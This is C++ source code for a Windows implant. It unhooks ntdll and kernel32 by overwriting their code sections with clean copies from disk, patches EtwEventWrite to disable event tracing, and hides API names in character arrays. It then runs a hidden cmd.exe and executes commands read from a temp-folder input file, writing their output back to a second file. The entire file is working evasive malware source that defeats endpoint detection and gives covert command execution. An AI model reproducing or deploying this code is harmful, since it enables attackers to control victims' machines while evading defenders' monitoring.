#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <thread>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <wincrypt.h>
#pragma comment(lib, "wininet.lib")
#define _WIN32_WINNT 0x0501
#include <fstream>
#include <string>
#define BUFF_SIZE 4096

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(NTAPI * NtClose_t)(HANDLE);
typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);
typedef HANDLE(WINAPI *CreateFile_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef SIZE_T(WINAPI *VirtualQuery_t)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef BOOL(WINAPI *FlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef BOOL (WINAPI * CreateProcess_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI * CreatePipe_t)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI * SetHandleInformation_t)(HANDLE, DWORD, DWORD);
typedef BOOL (WINAPI * WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI * ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI * GetTempPath_t)(DWORD nBufferLength, LPSTR lpBuffer);
typedef HANDLE (WINAPI *GetCurrentProcess_t)(void);


unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sNtProtectVirtualMemory[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
unsigned char sCreateFile[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
unsigned char sNtClose[] = { 'N', 't', 'C', 'l', 'o', 's', 'e', 0x0 };
unsigned char sCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x0 };
unsigned char sCreatePipe[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'i', 'p', 'e', 0x0 };
unsigned char sSetHandleInformation[] = { 'S', 'e', 't', 'H', 'a', 'n', 'd', 'l', 'e', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 0x0 };
unsigned char sWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
unsigned char sReadFile[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x0 };
unsigned char sGetTempPath[] = { 'G', 'e', 't', 'T', 'e', 'm', 'p', 'P', 'a', 't', 'h', 'A', 0x0 };
unsigned char sVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
unsigned char sFlushInstructionCache[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e', 0x0 };
unsigned char sGetCurrentProcess[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };

// Global variables for pipe handles
HANDLE g_hChildStd_IN_Rd;
HANDLE g_hChildStd_IN_Wr;
HANDLE g_hChildStd_OUT_Rd;
HANDLE g_hChildStd_OUT_Wr;


int CheckETW(void) {
	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtProtectVirtualMemory);
	VirtualQuery_t pVirtualQuery = (VirtualQuery_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualQuery);
	FlushInstructionCache_t pFlushInstructionCache = (FlushInstructionCache_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sFlushInstructionCache);
	GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetCurrentProcess);

	unsigned char sEtwEventWrite[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0x0 };
	
	void* pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)sEtwEventWrite);
	if (pEventWrite == NULL) {
		//printf("Failed to get address of EtwEventWrite. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	MEMORY_BASIC_INFORMATION mbi;
	if (!pVirtualQuery(pEventWrite, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
		//printf("VirtualQuery failed. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	NTSTATUS status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), PAGE_EXECUTE_READWRITE, &oldprotect);
	if (status != STATUS_SUCCESS) {
		//printf("Failed to change memory protection. Error: 0x%08x\n", status);
		return -1;
	}

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif

	status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), oldprotect, &oldprotect);
	if (status != STATUS_SUCCESS) {
		//printf("Failed to restore memory protection. Error: 0x%08x\n", status);
		return -1;
	}

	pFlushInstructionCache(pGetCurrentProcess(), pEventWrite, mbi.RegionSize);
	return 0;
}

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
	int i;
	
	unsigned char sTEXT[] = {'.', 't', 'e', 'x', 't', 0x0 };
	
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtProtectVirtualMemory);
	GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetCurrentProcess);
	
	SIZE_T size;
	PVOID addr;
	NTSTATUS status;
	
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, (LPCSTR) sTEXT)) {
			addr = (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress);
			size = pImgSectionHead->Misc.VirtualSize;
			status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &addr, &size, PAGE_EXECUTE_READWRITE, &oldprotect);
			
			if (!NT_SUCCESS(status)) {
				//printf("NTVirtProtect part 1 in Unhook failed");
				return -1;
			}

			memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
				   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
				   pImgSectionHead->Misc.VirtualSize);

			status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &addr, &size, oldprotect, &oldprotect);

			if (!NT_SUCCESS(status)) {
				//printf("NTVirtProtect part 2 in Unhook failed");
				return -1;
			}

			return 0;
		}
	}

	return -1;
}

int MapandUnhook(LPCSTR filepath, LPCSTR moduleName) {

	int ret = 0;
	HANDLE hFile; 
	HANDLE hFileMapping;
	LPVOID pMapping;
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
    NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtClose);
	CreateFile_t pCreateFile = (CreateFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFile);

	
	hFile = pCreateFile((LPCSTR) filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			return -1;
	}
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) {
			pNtClose(hFile);
			return -1;
	}
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
					pNtClose(hFileMapping);
					pNtClose(hFile);
					return -1;
	}
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) moduleName), pMapping);
	UnmapViewOfFile_p(pMapping);
	//printf("unhooked\n");
	pNtClose(hFileMapping);
	pNtClose(hFile);
	return 0;
}

void CreateChildProcess() { 

   CreateProcess_t pCreateProcess = (CreateProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateProcess);
   NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtClose);

   PROCESS_INFORMATION piProcInfo; 
   STARTUPINFO siStartInfo;
   BOOL bSuccess = FALSE; 

   // Set up members of the PROCESS_INFORMATION structure
   ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

   // Set up members of the STARTUPINFO structure
   ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
   siStartInfo.cb = sizeof(STARTUPINFO); 
   siStartInfo.hStdError = g_hChildStd_OUT_Wr;
   siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
   siStartInfo.hStdInput = g_hChildStd_IN_Rd;
   siStartInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   siStartInfo.wShowWindow = SW_HIDE;

   unsigned char sCMD[] = {'c', 'm', 'd', '.', 'e', 'x', 'e', 0x0 };

   bSuccess = pCreateProcess(NULL, 
      (LPSTR) sCMD,       
      NULL,          
      NULL,          
      TRUE,          
      CREATE_NO_WINDOW,             
      NULL,          
      NULL,          
      &siStartInfo,  
      &piProcInfo);  

   if (!bSuccess) 
      //std::cerr << "CreateProcess failed" << std::endl;
		return;
   else {
      //std::cout << "CreateProcess succeeded" << std::endl;
      pNtClose(piProcInfo.hProcess);
      pNtClose(piProcInfo.hThread);
   }
}

void CreatePipes() {
	
	CreatePipe_t pCreatePipe = (CreatePipe_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreatePipe);
	SetHandleInformation_t pSetHandleInformation = (SetHandleInformation_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sSetHandleInformation);

    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT
    if (! pCreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
        std::cerr << "Stdout pipe creation failed\n";
        return;
    }

    // Ensure the read handle to the pipe for STDOUT is not inherited
    if (! pSetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "Stdout SetHandleInformation Error\n";
        return;
    }

    // Create a pipe for the child process's STDIN 
    if (! pCreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
        std::cerr << "Stdin pipe creation failed\n";
        return;
    }

    // Ensure the write handle to the pipe for STDIN is not inherited
    if (! pSetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "Stdin SetHandleInformation Error\n";
        return;
    }
}

void WriteToPipe(const char* cmd) 
{ 
   WriteFile_t pWriteFile = (WriteFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteFile);

   DWORD dwWritten; 
   BOOL bSuccess = FALSE;

   std::string command = std::string(cmd) + "\nEND_OF_CMD\n";

   bSuccess = pWriteFile(g_hChildStd_IN_Wr, command.c_str(), command.size(), &dwWritten, NULL);
   if (!bSuccess) 
      //std::cerr << "WriteFile failed" << std::endl;
		return;
   //else
      //std::cout << "WriteFile succeeded" << std::endl;
}

std::string ReadFromPipe()
{
   
   ReadFile_t pReadFile = (ReadFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sReadFile);
	
   DWORD dwRead; 
   CHAR chBuf[BUFF_SIZE];
   BOOL bSuccess = FALSE;

   std::string cmdOutput = "";

   for (;;) 
   { 
      bSuccess = pReadFile( g_hChildStd_OUT_Rd, chBuf, BUFF_SIZE, &dwRead, NULL);
      if (!bSuccess || dwRead == 0) {
         std::cerr << "ReadFile failed" << std::endl;
         break;
      }

      cmdOutput += std::string(chBuf, dwRead);

      // If the end signal is found, remove it and stop reading.
      size_t endPos = cmdOutput.find("END_OF_CMD");
      if (endPos != std::string::npos) {
         cmdOutput.erase(endPos);
         break;
      }
   }

   return cmdOutput;
}

std::string pathInputFile, pathOutputFile;

void initializeTempFilePaths() {
	
	GetTempPath_t pGetTempPath = (GetTempPath_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetTempPath);

   unsigned char sINPUT[] = {'i', 'n', 'p', 'u', 't', '.', 't', 'x', 't', 0x0 };
   unsigned char sOUTPUT[] = {'o', 'u', 't', 'p', 'u', 't', '.', 't', 'x', 't', 0x0 };


    char tempPath[MAX_PATH];
    pGetTempPath(MAX_PATH, tempPath);
    pathInputFile = std::string(tempPath) + (LPCSTR) sINPUT;
    pathOutputFile = std::string(tempPath) + (LPCSTR) sOUTPUT;
}

void writeFile(const std::string& filePath, const std::string& data) {
    std::ofstream outFile(filePath);
    outFile << data;
    outFile.close();
}

bool fileExists(const std::string& filePath) {
    return std::filesystem::exists(filePath);
}

std::string readFile(const std::string& filePath) {
    std::ifstream inFile(filePath);
    std::string output((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();
    return output;
}

void deleteFile(const std::string& filePath) {
    std::remove(filePath.c_str());
}

bool readCommandFileAndExecute(std::string& cmd) {
    if (fileExists(pathInputFile)) {
        std::string cmd = readFile(pathInputFile);
		
		if (cmd.substr(0, 4) == "exit") {
			//std::cout << "Exit command received. Terminating the program." << std::endl;
			WriteToPipe(cmd.c_str());
			deleteFile(pathInputFile);
			deleteFile(pathOutputFile);
			return false;
		}

		WriteToPipe(cmd.c_str());

        std::this_thread::sleep_for(std::chrono::seconds(2));


		std::string output = ReadFromPipe();
		writeFile(pathOutputFile, output);

    }
    return true;
}

int main() {

    unsigned char sKernel32PATH[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\', 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
    unsigned char sNtdllPATH[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };

	MapandUnhook((LPCSTR)sNtdllPATH,(LPCSTR) sNtdll);
	MapandUnhook((LPCSTR)sKernel32PATH,(LPCSTR) sKernel32);

	CheckETW();

    initializeTempFilePaths();

    CreatePipes();

    CreateChildProcess();

    std::string cmd = ""; 

    while (true) {
        if (!readCommandFileAndExecute(cmd)) break;
        std::this_thread::sleep_for(std::chrono::seconds(6));
    }

    return 0;
}